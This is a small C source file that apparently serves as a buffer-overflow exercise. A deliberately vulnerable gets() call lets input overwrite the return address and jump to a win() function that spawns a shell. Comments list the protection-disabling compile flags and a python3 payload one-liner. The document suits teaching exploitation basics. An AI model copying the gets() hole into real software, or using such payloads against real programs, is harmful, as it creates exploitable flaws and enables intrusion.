// vuln.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char *gets(char *); // From c11 standard gets is deprecated but can still be linked

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[32];
    gets(buf);
    puts("You entered:");
    puts(buf);
}

int main() {
    vuln();
    // win();
    return 0;
}

// Compile with: gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
// Find the address of win() using nm: nm vuln | grep win
// Run the program and enter a string that overflows the buffer and overwrites the return address with the address of win()

// Example payload (assuming win() is at 0000000000401176):
// python3 -c "print('A' * (32+8) + '\x76\x11\x40\x00\x00\x00\x00\x00', end='')" | ./vuln

// Details:
// - '+8' counts saved RBP for 64-bit architecture
// - 'A' * (32+8) fills the buffer and the saved RBP with 'A's
// - the address of win() is reversed because of little-endian format
// - the buffer overflow occurs because gets() does not check the length of the input
// - the stack is executable because of the -z execstack flag
// - the stack protector is disabled with -fno-stack-protector
// - the position-independent executable (PIE) is disabled with -no-pie
// - the program is compiled without stack canaries, which would normally prevent this kind of attack

